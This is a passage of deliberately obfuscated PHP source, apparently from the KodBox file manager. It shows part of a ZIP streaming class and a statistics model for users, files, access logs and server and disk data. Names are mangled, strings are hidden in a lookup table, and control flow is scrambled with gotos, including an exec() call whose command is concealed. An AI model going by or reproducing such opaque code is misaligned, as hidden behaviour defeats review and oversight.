$bÍ„¡Ë¡Ğ‚[33]; $B©íàŞË— = array(array($bÍ„¡Ë¡Ğ‚[1981], static::CDR_EOF_SIGNATURE), array($bÍ„¡Ë¡Ğ‚[1982], 0), array($bÍ„¡Ë¡Ğ‚[1982], 0), array($bÍ„¡Ë¡Ğ‚[1982], $fº§ˆ—Ó¯”), array($bÍ„¡Ë¡Ğ‚[1982], $fº§ˆ—Ó¯”), array($bÍ„¡Ë¡Ğ‚[1981], 4294967295), array($bÍ„¡Ë¡Ğ‚[1981], 4294967295), array($bÍ„¡Ë¡Ğ‚[1982], strlen($EŞ‡•äÔŞ—))); goto E›ÏÉ¨×ãÙ; E›ÏÉ¨×ãÙ: $b½ùóÏÑà» = $this->packFields($B©íàŞË—) . $EŞ‡•äÔŞ—; $this->send($b½ùóÏÑà»); goto B°ˆù‹§„Ì; B°ˆù‹§„Ì: } protected function addCdr() { foreach ($this->files as $A¥é¿°°ê) { $this->addCdrFile($A¥é¿°°ê); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $eÉ”’Í‰Ãø =& $_SERVER[Ìó]; $F ±²¢Ù = $eÉ”’Í‰Ãø[198]; if ($this->outputName) { $dô²å·ï™µ = trim(str_replace(array($eÉ”’Í‰Ãø[112], $eÉ”’Í‰Ãø[55], $eÉ”’Í‰Ãø[93], $eÉ”’Í‰Ãø[67], $eÉ”’Í‰Ãø[213], $eÉ”’Í‰Ãø[988]), $eÉ”’Í‰Ãø[33], $this->outputName)); $c¤ÄèÑÒÖ¶ = rawurlencode($dô²å·ï™µ); $F ±²¢Ù .= "\73\x20\146\151\x6c\x65\x6e\141\155\x65\52\75\x75\164\146\x2d\70\x27\47{$c¤ÄèÑÒÖ¶}"; } $D©«À„ÊÔ½ = array($eÉ”’Í‰Ãø[195] => $eÉ”’Í‰Ãø[1984], $eÉ”’Í‰Ãø[1985] => $F ±²¢Ù, $eÉ”’Í‰Ãø[1986] => $eÉ”’Í‰Ãø[1987], $eÉ”’Í‰Ãø[1988] => $eÉ”’Í‰Ãø[1989], $eÉ”’Í‰Ãø[1990] => $eÉ”’Í‰Ãø[1991]); foreach ($D©«À„ÊÔ½ as $Fõï’Ûº±Ú => $E½ šİé») { header($Fõï’Ûº±Ú . $eÉ”’Í‰Ãø[878] . $E½ šİé»); } } protected function send($e«¯¡÷”Øí) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $e«¯¡÷”Øí); } protected final function dosTime($Añ¯È÷•¤) { $b²µØ¢ç§Ñ =& $_SERVER[Ìó]; $f÷ëĞ”©† = getdate($Añ¯È÷•¤); if ($f÷ëĞ”©†[$b²µØ¢ç§Ñ[1694]] < 1980) { $f÷ëĞ”©† = array($b²µØ¢ç§Ñ[1694] => 1980, $b²µØ¢ç§Ñ[1992] => 1, $b²µØ¢ç§Ñ[1993] => 1, $b²µØ¢ç§Ñ[1994] => 0, $b²µØ¢ç§Ñ[1995] => 0, $b²µØ¢ç§Ñ[1996] => 0); } $f÷ëĞ”©†[$b²µØ¢ç§Ñ[1694]] -= 1980; return $f÷ëĞ”©†[$b²µØ¢ç§Ñ[1694]] << 25 | $f÷ëĞ”©†[$b²µØ¢ç§Ñ[1992]] << 21 | $f÷ëĞ”©†[$b²µØ¢ç§Ñ[1993]] << 16 | $f÷ëĞ”©†[$b²µØ¢ç§Ñ[1994]] << 11 | $f÷ëĞ”©†[$b²µØ¢ç§Ñ[1995]] << 5 | $f÷ëĞ”©†[$b²µØ¢ç§Ñ[1996]] >> 1; } protected function packFields($BÁŞíµáÇ±) { $d„®ªŠÈ¿ =& $_SERVER[Ìó]; $AÛ·İÈ‘Œã = $d„®ªŠÈ¿[33]; $FÛÑÌ‹—ø‹ = array(); foreach ($BÁŞíµáÇ± as $B¥¯‹Ö”±) { $AÛ·İÈ‘Œã .= $B¥¯‹Ö”±[0]; $FÛÑÌ‹—ø‹[] = $B¥¯‹Ö”±[1]; } array_unshift($FÛÑÌ‹—ø‹, $AÛ·İÈ‘Œã); return call_user_func_array($d„®ªŠÈ¿[1997], $FÛÑÌ‹—ø‹); } protected function filterFilename($D˜âÅ•³±â) { $dä­–Íéì¯ =& $_SERVER[Ìó]; return str_replace(array($dä­–Íéì¯[93], $dä­–Íéì¯[4], $dä­–Íéì¯[172], $dä­–Íéì¯[69], $dä­–Íéì¯[112], $dä­–Íéì¯[923], $dä­–Íéì¯[926], $dä­–Íéì¯[267]), $dä­–Íéì¯[70], $D˜âÅ•³±â); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($DÏöØë›ì‹) { $CÀÂÔ¥ìôÎ =& $_SERVER[Ìó]; $cĞ‡ÓÁŞ = array($CÀÂÔ¥ìôÎ[530] => array($CÀÂÔ¥ìôÎ[29] => $CÀÂÔ¥ìôÎ[1998], $CÀÂÔ¥ìôÎ[257] => array($CÀÂÔ¥ìôÎ[206], $CÀÂÔ¥ìôÎ[696], $CÀÂÔ¥ìôÎ[1999], $CÀÂÔ¥ìôÎ[2000])), $CÀÂÔ¥ìôÎ[2001] => array($CÀÂÔ¥ìôÎ[29] => $CÀÂÔ¥ìôÎ[2002], $CÀÂÔ¥ìôÎ[257] => array($CÀÂÔ¥ìôÎ[206], $CÀÂÔ¥ìôÎ[694], $CÀÂÔ¥ìôÎ[2003], $CÀÂÔ¥ìôÎ[2004], $CÀÂÔ¥ìôÎ[2005]))); if (!isset($cĞ‡ÓÁŞ[$DÏöØë›ì‹])) { return !1; } $this->optionType = $cĞ‡ÓÁŞ[$DÏöØë›ì‹][$CÀÂÔ¥ìôÎ[29]]; $this->field = $cĞ‡ÓÁŞ[$DÏöØë›ì‹][$CÀÂÔ¥ìôÎ[257]]; return !0; } public function listData($CÒƒ–š„æ³ = false, $Cäƒ¢¬Ú¾ = "\x6d\157\x64\151\x66\171\124\151\x6d\145", $aÏØ¼Ú„ = false) { return parent::listData($CÒƒ–š„æ³, $Cäƒ¢¬Ú¾, $aÏØ¼Ú„); } public function trendList($Aê´µÃÃ®) { goto Eƒ¡Ï†èÒ; a×˜šŠâ„Å: if (!isset($EÅ—Ëâ×ÉŒ)) { $f‰“í‡‡’£ = $Aê´µÃÃ® == $f‘¦Íˆ”‘»[530] ? $f‘¦Íˆ”‘»[472] : $f‘¦Íˆ”‘»[748]; $EÅ—Ëâ×ÉŒ = Model($f‰“í‡‡’£)->min($f‘¦Íˆ”‘»[183]); } $e¡À«®Ú‰ = $f‘¦Íˆ”‘»[2008] . ucfirst($Aê´µÃÃ®); $eœÅæÉ»¢È = $this->dateList($EÅ—Ëâ×ÉŒ); goto díŒÓáŠß‰; Eƒ¡Ï†èÒ: $f‘¦Íˆ”‘» =& $_SERVER[Ìó]; $f™ÓÀ¡° = $this->listData(); if ($f™ÓÀ¡°) { $F‹Ô±­Ó¸ò = end($f™ÓÀ¡°); $a®×Ğ²ÅÇ£ = date($f‘¦Íˆ”‘»[2006], strtotime($f‘¦Íˆ”‘»[2007])); if ($F‹Ô±­Ó¸ò[$f‘¦Íˆ”‘»[206]] == $a®×Ğ²ÅÇ£) { return $f™ÓÀ¡°; } $EÅ—Ëâ×ÉŒ = strtotime($F‹Ô±­Ó¸ò[$f‘¦Íˆ”‘»[206]]); } goto a×˜šŠâ„Å; díŒÓáŠß‰: foreach ($eœÅæÉ»¢È as $a®×Ğ²ÅÇ£) { $this->{$e¡À«®Ú‰}($a®×Ğ²ÅÇ£); } return $this->listData(); goto FİÌùß’½; FİÌùß’½: } private function dateList($DµÏ”ğî³) { $få¥£ÔµÉ =& $_SERVER[Ìó]; $AŠÅùÅ¨Ú« = $DµÏ”ğî³; $c§“±Çô± = strtotime($få¥£ÔµÉ[2007]); $BÙ®Âä¯ö¸ = array(); while ($AŠÅùÅ¨Ú« <= $c§“±Çô±) { $BÙ®Âä¯ö¸[] = date($få¥£ÔµÉ[2006], $AŠÅùÅ¨Ú«); $AŠÅùÅ¨Ú« = strtotime($få¥£ÔµÉ[2009], $AŠÅùÅ¨Ú«); } return $BÙ®Âä¯ö¸; } public function _recordUser($DÄ·›Ÿ²ï = '') { goto Cì‹‰”±¤·; fô—¤›¬Š: $Eè¬öø¨Ãî = Model($cò„Ûƒ£[472])->where($d±ˆØø²)->count($cò„Ûƒ£[1409]); $d±ˆØø²[$cò„Ûƒ£[29]] = $cò„Ûƒ£[2012]; $eòÆÁÓ…ö¨ = Model($cò„Ûƒ£[2013])->where($d±ˆØø²)->count($cò„Ûƒ£[2014]); goto FĞ‘º“¤ê; Cì‹‰”±¤·: $cò„Ûƒ£ =& $_SERVER[Ìó]; $c²È‚ù’ßİ = strtotime(date($cò„Ûƒ£[2010], strtotime($DÄ·›Ÿ²ï))); $eî¶ÈÛë = strtotime(date($cò„Ûƒ£[2011], strtotime($DÄ·›Ÿ²ï))); goto B¢Ïô²”ñ; B¢Ïô²”ñ: $d±ˆØø² = array($cò„Ûƒ£[183] => array($cò„Ûƒ£[925], $eî¶ÈÛë)); $cÌ¦™Â‡ = Model($cò„Ûƒ£[472])->where($d±ˆØø²)->count($cò„Ûƒ£[1409]); $d±ˆØø²[$cò„Ûƒ£[183]] = array($cò„Ûƒ£[317], array($c²È‚ù’ßİ, $eî¶ÈÛë)); goto fô—¤›¬Š; FĞ‘º“¤ê: $bÀÂ££‰òÆ = array($cò„Ûƒ£[206] => $DÄ·›Ÿ²ï, $cò„Ûƒ£[696] => (int) $cÌ¦™Â‡, $cò„Ûƒ£[1999] => (int) $Eè¬öø¨Ãî, $cò„Ûƒ£[2000] => (int) $eòÆÁÓ…ö¨); return $this->insert($bÀÂ££‰òÆ); goto b¿¬æ¶ã¶Ï; b¿¬æ¶ã¶Ï: } public function _recordStore($bßíÍÍõ = '') { goto fèÒÅ°ÃÊÅ; fèÒÅ°ÃÊÅ: $C¢‘¤ÆÄ¾ =& $_SERVER[Ìó]; $fø·ïÓÂø¨ = strtotime(date($C¢‘¤ÆÄ¾[2011], strtotime($bßíÍÍõ))); $EĞ™ƒŒ©× = array($C¢‘¤ÆÄ¾[183] => array($C¢‘¤ÆÄ¾[925], $fø·ïÓÂø¨)); goto dº‚ƒó´ø§; d¢³õÎßÚÁ: $EĞ™ƒŒ©×[$C¢‘¤ÆÄ¾[367]] = 1; $bî–©ô™Ã = Model($C¢‘¤ÆÄ¾[748])->where($EĞ™ƒŒ©×)->sum($C¢‘¤ÆÄ¾[77]); $EĞ™ƒŒ©×[$C¢‘¤ÆÄ¾[367]] = 2; goto aÀ½¯âæ¶ô; dº‚ƒó´ø§: $d‡»ê™ìä¯ = Model($C¢‘¤ÆÄ¾[417])->where($EĞ™ƒŒ©×)->sum($C¢‘¤ÆÄ¾[77]); $EĞ™ƒŒ©×[$C¢‘¤ÆÄ¾[366]] = 0; $B±…Ë…­Û = Model($C¢‘¤ÆÄ¾[748])->where($EĞ™ƒŒ©×)->sum($C¢‘¤ÆÄ¾[77]); goto d¢³õÎßÚÁ; aÀ½¯âæ¶ô: $B¡²¡„“ªŠ = Model($C¢‘¤ÆÄ¾[748])->where($EĞ™ƒŒ©×)->sum($C¢‘¤ÆÄ¾[77]); $Bï›ŠÙƒá = array($C¢‘¤ÆÄ¾[206] => $bßíÍÍõ, $C¢‘¤ÆÄ¾[694] => (int) $B±…Ë…­Û, $C¢‘¤ÆÄ¾[2003] => (int) $d‡»ê™ìä¯, $C¢‘¤ÆÄ¾[2004] => (int) $bî–©ô™Ã, $C¢‘¤ÆÄ¾[2005] => (int) $B¡²¡„“ªŠ); return $this->insert($Bï›ŠÙƒá); goto C¢½ÆİêÜ; C¢½ÆİêÜ: } public function trend($dÚ±ŸÖáŞˆ, $Fòª‡´åä) { goto EÇßÄ¦ÆÙ¤; fÖè‘ä—«¬: if ($d†÷¬›˜¨Å && $Fòª‡´åä != $eØœæ¨ö³»[1384]) { $D­–¡›æÛ¨ = $d†÷¬›˜¨Å[0][$eØœæ¨ö³»[206]]; $b‘Ï‹ÜÌ¥ã = $this->validDate($Fòª‡´åä, $D­–¡›æÛ¨); $DÔ‘ä£ ·º = array(); $aªµ½¡«¡é = array_to_keyvalue($d†÷¬›˜¨Å, $eØœæ¨ö³»[206]); foreach ($b‘Ï‹ÜÌ¥ã as $DøáëŒƒáÒ) { if (isset($aªµ½¡«¡é[$DøáëŒƒáÒ])) { $f„Â±Ü‚¾ç = $aªµ½¡«¡é[$DøáëŒƒáÒ]; } else { $f„Â±Ü‚¾ç = end($d†÷¬›˜¨Å); $f„Â±Ü‚¾ç[$eØœæ¨ö³»[206]] = $DøáëŒƒáÒ; if ($dÚ±ŸÖáŞˆ == $eØœæ¨ö³»[530]) { $f„Â±Ü‚¾ç[$eØœæ¨ö³»[1999]] = $f„Â±Ü‚¾ç[$eØœæ¨ö³»[2000]] = 0; } } $DÔ‘ä£ ·º[] = $f„Â±Ü‚¾ç; } $d†÷¬›˜¨Å = $DÔ‘ä£ ·º; } $C„ˆ™íÜÑ¼ = array($eØœæ¨ö³»[530] => array($eØœæ¨ö³»[696] => LNG($eØœæ¨ö³»[2015]), $eØœæ¨ö³»[1999] => LNG($eØœæ¨ö³»[2016]), $eØœæ¨ö³»[2000] => LNG($eØœæ¨ö³»[2017])), $eØœæ¨ö³»[2001] => array($eØœæ¨ö³»[694] => LNG($eØœæ¨ö³»[2018]), $eØœæ¨ö³»[2003] => LNG($eØœæ¨ö³»[2019]), $eØœæ¨ö³»[2004] => LNG($eØœæ¨ö³»[2020]), $eØœæ¨ö³»[2005] => LNG($eØœæ¨ö³»[2021]))); $E½ ÎÁöé = array($eØœæ¨ö³»[530] => $eØœæ¨ö³»[2022], $eØœæ¨ö³»[2001] => $eØœæ¨ö³»[77]); goto AÔçÌä²«È; C–ìÜ‘ñ¸Ô: return $e¡ÙŒŸ²‹ó; goto b¨œš…’ó”; AÔçÌä²«È: if (empty($d†÷¬›˜¨Å)) { $DøáëŒƒáÒ = date($eØœæ¨ö³»[2006], strtotime($eØœæ¨ö³»[2007])); $D„êÅÇ¨µ× = array($eØœæ¨ö³»[206] => $DøáëŒƒáÒ); foreach ($C„ˆ™íÜÑ¼[$dÚ±ŸÖáŞˆ] as $fÔÄŠÓí— => $CšÑ®àÑÜ„) { $D„êÅÇ¨µ×[$fÔÄŠÓí—] = 0; } $d†÷¬›˜¨Å[] = $D„êÅÇ¨µ×; } $e¡ÙŒŸ²‹ó = array(); foreach ($d†÷¬›˜¨Å as $CšÑ®àÑÜ„) { if ($dÚ±ŸÖáŞˆ == $eØœæ¨ö³»[2001] && $CšÑ®àÑÜ„[$eØœæ¨ö³»[2003]] > $CšÑ®àÑÜ„[$eØœæ¨ö³»[694]]) { $CšÑ®àÑÜ„[$eØœæ¨ö³»[2003]] = $CšÑ®àÑÜ„[$eØœæ¨ö³»[694]]; } foreach ($C„ˆ™íÜÑ¼[$dÚ±ŸÖáŞˆ] as $fÔÄŠÓí— => $Aè÷Ÿ¬´…°) { $f„Â±Ü‚¾ç = array($eØœæ¨ö³»[206] => $CšÑ®àÑÜ„[$eØœæ¨ö³»[206]], $eØœæ¨ö³»[1317] => $Aè÷Ÿ¬´…°); $f„Â±Ü‚¾ç[$E½ ÎÁöé[$dÚ±ŸÖáŞˆ]] = isset($CšÑ®àÑÜ„[$fÔÄŠÓí—]) ? $CšÑ®àÑÜ„[$fÔÄŠÓí—] : 0; $e¡ÙŒŸ²‹ó[] = $f„Â±Ü‚¾ç; } } goto C–ìÜ‘ñ¸Ô; EÇßÄ¦ÆÙ¤: $eØœæ¨ö³» =& $_SERVER[Ìó]; if (!$this->init($dÚ±ŸÖáŞˆ)) { return !1; } $d†÷¬›˜¨Å = $this->trendList($dÚ±ŸÖáŞˆ); goto fÖè‘ä—«¬; b¨œš…’ó”: } public function validDate($døÈÁ¸Ğ¢ğ, $EÔÀ·ÎÊ§…) { goto E“Ğ¾‹ª½¼; e¸¾»Ü–â–: return $BÓ¶¤Û‡ÊÉ; goto a‰†Õ¦ŒŒà; e°ò‚ìªñ: switch ($døÈÁ¸Ğ¢ğ) { case $Eƒò»ÍÄ¤Æ[1391]: $EÒŠ‚’ÑÌŠ = mktime(0, 0, 0, date($Eƒò»ÍÄ¤Æ[2023]), date($Eƒò»ÍÄ¤Æ[2024]) - date($Eƒò»ÍÄ¤Æ[1214]) + 7 - 7, date($Eƒò»ÍÄ¤Æ[2025])); $C•Á…ø˜³‚ = 0; do { $cÖò†­ÁÎ = date($Eƒò»ÍÄ¤Æ[2006], $EÒŠ‚’ÑÌŠ - 3600 * 24 * 7 * $C•Á…ø˜³‚); $BÓ¶¤Û‡ÊÉ[] = $cÖò†­ÁÎ; $C•Á…ø˜³‚++; } while ($EÔÀ·ÎÊ§… < $cÖò†­ÁÎ); break; case $Eƒò»ÍÄ¤Æ[1389]: $C•Á…ø˜³‚ = 1; do { $c®Îä»ìè¼ = date($Eƒò»ÍÄ¤Æ[2026], strtotime("\55\x20{$C•Á…ø˜³‚}\40\x6d\x6f\x6e\x74\150\163")); $BÓ¶¤Û‡ÊÉ[] = $c®Îä»ìè¼; $C•Á…ø˜³‚++; } while ($EÔÀ·ÎÊ§… < $c®Îä»ìè¼); break; case $Eƒò»ÍÄ¤Æ[1694]: $bŞÅİãÖµÒ = (int) date($Eƒò»ÍÄ¤Æ[2025], strtotime($EÔÀ·ÎÊ§…)); $dÌ±ºÍ¦Ö… = (int) date($Eƒò»ÍÄ¤Æ[2025]); if ($bŞÅİãÖµÒ >= $dÌ±ºÍ¦Ö…) { break; } for ($bŞÅİãÖµÒ; $bŞÅİãÖµÒ < $dÌ±ºÍ¦Ö…; $bŞÅİãÖµÒ++) { $BÓ¶¤Û‡ÊÉ[] = $bŞÅİãÖµÒ . $Eƒò»ÍÄ¤Æ[2027]; } break; default: break; } if ($EÔÀ·ÎÊ§… > end($BÓ¶¤Û‡ÊÉ)) { array_pop($BÓ¶¤Û‡ÊÉ); } sort($BÓ¶¤Û‡ÊÉ); goto e¸¾»Ü–â–; E“Ğ¾‹ª½¼: $Eƒò»ÍÄ¤Æ =& $_SERVER[Ìó]; $BÍ×îìÚ = date($Eƒò»ÍÄ¤Æ[2006], strtotime($Eƒò»ÍÄ¤Æ[2007])); $BÓ¶¤Û‡ÊÉ = array($BÍ×îìÚ); goto e°ò‚ìªñ; a‰†Õ¦ŒŒà: } public function listTable($A¸Ô‘‹ª˜¾) { $C÷»ôÌ‰ô = ucfirst($A¸Ô‘‹ª˜¾); return Model($C÷»ôÌ‰ô)->listData(); } public function option($eâÍ ‘Ÿ¯”) { $b’­æ±·Ç = $_SERVER[Ìó][2028] . ucfirst($eâÍ ‘Ÿ¯”); return $this->{$b’­æ±·Ç}(); } private function optionUser() { goto e…Âˆ„™£‰; AÕ‡â‡àŸ: $d²•°®”Ùç = Model($e÷¢µ˜ÕË‡[472])->where($Fôµ¡İÀã)->count($e÷¢µ˜ÕË‡[1409]); return array($e÷¢µ˜ÕË‡[691] => (int) $B¢®é‚ÛÉ«, $e÷¢µ˜ÕË‡[2032] => (int) ($B¢®é‚ÛÉ« - $e¼É—ğ‘áÆ), $e÷¢µ˜ÕË‡[2033] => (int) $e¼É—ğ‘áÆ, $e÷¢µ˜ÕË‡[2034] => (int) $d²•°®”Ùç, $e÷¢µ˜ÕË‡[2035] => $Dˆ·æô); goto bæ‘‚Ş‘¸; e…Âˆ„™£‰: $e÷¢µ˜ÕË‡ =& $_SERVER[Ìó]; $B¢®é‚ÛÉ« = Model($e÷¢µ˜ÕË‡[472])->count($e÷¢µ˜ÕË‡[1409]); $e¼É—ğ‘áÆ = Model($e÷¢µ˜ÕË‡[472])->where($e÷¢µ˜ÕË‡[2029])->count($e÷¢µ˜ÕË‡[1409]); goto e½Ë¢ª•§; e½Ë¢ª•§: $B™±·É†ä = strtotime($e÷¢µ˜ÕË‡[2030]); $Fôµ¡İÀã = array($e÷¢µ˜ÕË‡[2031] => array($e÷¢µ˜ÕË‡[926], $B™±·É†ä)); $Dˆ·æô = (int) Model($e÷¢µ˜ÕË‡[472])->where($Fôµ¡İÀã)->count($e÷¢µ˜ÕË‡[1409]); goto D£ÎÆÀóß–; D£ÎÆÀóß–: if (!$Dˆ·æô) { $Dˆ·æô = 1; } $B™±·É†ä = strtotime(date($e÷¢µ˜ÕË‡[2010])); $Fôµ¡İÀã = array($e÷¢µ˜ÕË‡[2031] => array($e÷¢µ˜ÕË‡[926], $B™±·É†ä)); goto AÕ‡â‡àŸ; bæ‘‚Ş‘¸: } private function optionFile() { goto a‹×«››š; D¢Ÿ¤µØ—: $d¡ÏŒ—¢ù¬ = $fá¸‹äöš [$E½ÁŠ¢‹ÁÕ[2003]]; $BÈ»™¢İÒÜ = Model($E½ÁŠ¢‹ÁÕ[748])->where(array($E½ÁŠ¢‹ÁÕ[366] => 0))->count($E½ÁŠ¢‹ÁÕ[365]); $f£ù®µ½Û† = array($E½ÁŠ¢‹ÁÕ[366] => 0, $E½ÁŠ¢‹ÁÕ[183] => array($E½ÁŠ¢‹ÁÕ[926], strtotime(date($E½ÁŠ¢‹ÁÕ[2010])))); goto F°Í´°áĞÎ; a‹×«››š: $E½ÁŠ¢‹ÁÕ =& $_SERVER[Ìó]; $fá¸‹äöš  = $this->sourceSize(); $aé´ö÷¹Œ = $fá¸‹äöš [$E½ÁŠ¢‹ÁÕ[77]]; goto D¢Ÿ¤µØ—; F°Í´°áĞÎ: $a¤ä„„ÆÕù = Model($E½ÁŠ¢‹ÁÕ[748])->where($f£ù®µ½Û†)->sum($E½ÁŠ¢‹ÁÕ[77]); $d”Ÿ‡›šÕ = Model($E½ÁŠ¢‹ÁÕ[748])->where($f£ù®µ½Û†)->count($E½ÁŠ¢‹ÁÕ[365]); return array($E½ÁŠ¢‹ÁÕ[694] => $aé´ö÷¹Œ, $E½ÁŠ¢‹ÁÕ[2003] => $d¡ÏŒ—¢ù¬, $E½ÁŠ¢‹ÁÕ[2036] => $aé´ö÷¹Œ - $d¡ÏŒ—¢ù¬, $E½ÁŠ¢‹ÁÕ[2037] => (int) $a¤ä„„ÆÕù, $E½ÁŠ¢‹ÁÕ[696] => (int) $BÈ»™¢İÒÜ, $E½ÁŠ¢‹ÁÕ[2038] => (int) $d”Ÿ‡›šÕ); goto Cµ±§Åèí; Cµ±§Åèí: } private function optionAccess() { $A³ƒßÆ‹ì =& $_SERVER[Ìó]; return array($A³ƒßÆ‹ì[691] => $this->typeLogCnt(), $A³ƒßÆ‹ì[102] => $this->typeLogCnt($A³ƒßÆ‹ì[102]), $A³ƒßÆ‹ì[399] => $this->typeLogCnt($A³ƒßÆ‹ì[399]), $A³ƒßÆ‹ì[2039] => $this->typeLogCnt($A³ƒßÆ‹ì[2039]), $A³ƒßÆ‹ì[2040] => $this->typeLogCnt($A³ƒßÆ‹ì[2040]), $A³ƒßÆ‹ì[530] => $this->typeLogCnt($A³ƒßÆ‹ì[33], $A³ƒßÆ‹ì[2014])); } private function typeLogCnt($AÅ§®¤àÃ™ = '', $aæ­‹›©²² = "\151\144") { goto a¥¼¿ä‚á”; e…‰ôÒùá£: return (int) $E‰îäÄƒÓŠ; goto a‰—‡¥Şöá; a¥¼¿ä‚á”: $d÷Ö—Œ¬À =& $_SERVER[Ìó]; $d–ˆÂà™ = array($d÷Ö—Œ¬À[102] => array($d÷Ö—Œ¬À[2041], $d÷Ö—Œ¬À[2042]), $d÷Ö—Œ¬À[399] => array($d÷Ö—Œ¬À[2043], $d÷Ö—Œ¬À[2044]), $d÷Ö—Œ¬À[2039] => array($d÷Ö—Œ¬À[2045], $d÷Ö—Œ¬À[2046]), $d÷Ö—Œ¬À[2040] => array($d÷Ö—Œ¬À[2047], $d÷Ö—Œ¬À[2048]), $d÷Ö—Œ¬À[2049] => array($d÷Ö—Œ¬À[2050], $d÷Ö—Œ¬À[2051], $d÷Ö—Œ¬À[2052])); $dêñ¨ä×Ÿ = strtotime(date($d÷Ö—Œ¬À[2010])); goto dÏô„Î®¼ò; dÏô„Î®¼ò: $FçÙ½£”…Ö = array($d÷Ö—Œ¬À[183] => array($d÷Ö—Œ¬À[926], $dêñ¨ä×Ÿ)); if ($AÅ§®¤àÃ™) { $FçÙ½£”…Ö[$d÷Ö—Œ¬À[29]] = array($d÷Ö—Œ¬À[7], $d–ˆÂà™[$AÅ§®¤àÃ™]); } $E‰îäÄƒÓŠ = Model($d÷Ö—Œ¬À[2013])->where($FçÙ½£”…Ö)->count($aæ­‹›©²²); goto e…‰ôÒùá£; a‰—‡¥Şöá: } private function optionServer() { goto DÁ†ò¼æ‘; E‚½ç†‘: $eÓ©­ãèîî = $fá£®Ú‡ò[0]; $d“ÓŒÀª¿ = $GLOBALS[$AÁÅÁòŠ‰Ü[6]][$AÁÅÁòŠ‰Ü[17]]; $f‰¶Ë ÎŠº = $d“ÓŒÀª¿[$AÁÅÁòŠ‰Ü[886]]; goto Cª¹ÙŒêå˜; DÁ†ò¼æ‘: $AÁÅÁòŠ‰Ü =& $_SERVER[Ìó]; $aÈéŠß§ = $this->diskDriver(); $eåÉ„›­§¤ = KodIO::defaultDriver(); goto fâÎ«‘£µÔ; fâÎ«‘£µÔ: $cğ¦Í¸ô = array($AÁÅÁòŠ‰Ü[739] => $eåÉ„›­§¤[$AÁÅÁòŠ‰Ü[363]]); $aóò¾Ÿ™Ï = Model($AÁÅÁòŠ‰Ü[417])->where($cğ¦Í¸ô)->sum($AÁÅÁòŠ‰Ü[77]); $fá£®Ú‡ò = explode($AÁÅÁòŠ‰Ü[50], $_SERVER[$AÁÅÁòŠ‰Ü[137]]); goto E‚½ç†‘; Cª¹ÙŒêå˜: if ($f‰¶Ë ÎŠº == $AÁÅÁòŠ‰Ü[720]) { $F×Ä‰×‚¦ì = explode($AÁÅÁòŠ‰Ü[1072], $d“ÓŒÀª¿[$AÁÅÁòŠ‰Ü[885]]); $f‰¶Ë ÎŠº = $F×Ä‰×‚¦ì[0]; } if ($f‰¶Ë ÎŠº == $AÁÅÁòŠ‰Ü[723] || $f‰¶Ë ÎŠº == $AÁÅÁòŠ‰Ü[724]) { $cíØ ¥Ù = Model()->db()->query($AÁÅÁòŠ‰Ü[2053]); $CÒšô—ª…È = $cíØ ¥Ù[0] && isset($cíØ ¥Ù[0][$AÁÅÁòŠ‰Ü[1316]]) ? $cíØ ¥Ù[0][$AÁÅÁòŠ‰Ü[1316]] : 0; $f‰¶Ë ÎŠº = $AÁÅÁòŠ‰Ü[2054] . ($CÒšô—ª…È ? $AÁÅÁòŠ‰Ü[8] . $CÒšô—ª…È : $AÁÅÁòŠ‰Ü[33]); } $b­îŠÉö = $GLOBALS[$AÁÅÁòŠ‰Ü[6]][$AÁÅÁòŠ‰Ü[333]][$AÁÅÁòŠ‰Ü[749]]; goto C–ƒ¬Ğ‹Á; C–ƒ¬Ğ‹Á: return array($AÁÅÁòŠ‰Ü[2055] => $aÈéŠß§ ? $aÈéŠß§[$AÁÅÁòŠ‰Ü[2056]] : 0, $AÁÅÁòŠ‰Ü[2057] => $aÈéŠß§ ? $aÈéŠß§[$AÁÅÁòŠ‰Ü[2058]] : 0, $AÁÅÁòŠ‰Ü[2059] => (int) $eåÉ„›­§¤[$AÁÅÁòŠ‰Ü[2056]] * 1024 * 1024 * 1024, $AÁÅÁòŠ‰Ü[2060] => (int) $aóò¾Ÿ™Ï, $AÁÅÁòŠ‰Ü[2061] => ucfirst($eÓ©­ãèîî), $AÁÅÁòŠ‰Ü[2062] => $AÁÅÁòŠ‰Ü[2063] . PHP_VERSION, $AÁÅÁòŠ‰Ü[2064] => phpBuild64() ? 64 : 32, $AÁÅÁòŠ‰Ü[690] => str_replace($AÁÅÁòŠ‰Ü[2065], $AÁÅÁòŠ‰Ü[902], $f‰¶Ë ÎŠº), $AÁÅÁòŠ‰Ü[333] => ucfirst($b­îŠÉö), $AÁÅÁòŠ‰Ü[28] => $_SERVER[$AÁÅÁòŠ‰Ü[2066]]); goto bã¡ğàŸÕŞ; bã¡ğàŸÕŞ: } private function diskDriver() { goto aƒ­äİ”; A‰ßá“’´: $fğ’ˆˆâÛ¶ = $eÛ©Êïœ°ˆ - @disk_free_space($dÔ‘†´½ß); return array($eË†àÙÔÁã[2056] => $eÛ©Êïœ°ˆ, $eË†àÙÔÁã[2058] => $fğ’ˆˆâÛ¶); goto Fïæù‹ë²Ï; aƒ­äİ”: $eË†àÙÔÁã =& $_SERVER[Ìó]; $dÔ‘†´½ß = $eË†àÙÔÁã[8]; $aíí‚¹±”ä = $GLOBALS[$eË†àÙÔÁã[6]][$eË†àÙÔÁã[2067]] == $eË†àÙÔÁã[2068]; goto C…¦îÍêäÂ; C…¦îÍêäÂ: if ($aíí‚¹±”ä) { $dÔ‘†´½ß = $eË†àÙÔÁã[2069]; if (function_exists($eË†àÙÔÁã[2070])) { exec($eË†àÙÔÁã[2071], $a ’êÆŸ‡Š); $dÔ‘†´½ß = $a ’êÆŸ‡Š[1] . $eË†àÙÔÁã[8]; } } if (!file_exists($dÔ‘†´½ß)) { return; } $eÛ©Êïœ°ˆ = @disk_total_space($dÔ‘†´½ß); goto A‰ßá“’´; Fïæù‹ë²Ï: } public function fileChart($d‹ƒÖõ›ƒ¤) { goto dÈÏÃë½İ; FÈß‡õœÕ¡: $báô¼Ö†ø[$EİºˆÅè¶Ø[367]] = 2; $c»Á©¬ñ£ = Model($EİºˆÅè¶Ø[748])->where($báô¼Ö†ø)->sum($EİºˆÅè¶Ø[77]); return array($EİºˆÅè¶Ø[694] => $EÓ²ŞÍ‘Ä[$EİºˆÅè¶Ø[77]], $EİºˆÅè¶Ø[2003] => $EÓ²ŞÍ‘Ä[$EİºˆÅè¶Ø[2003]], 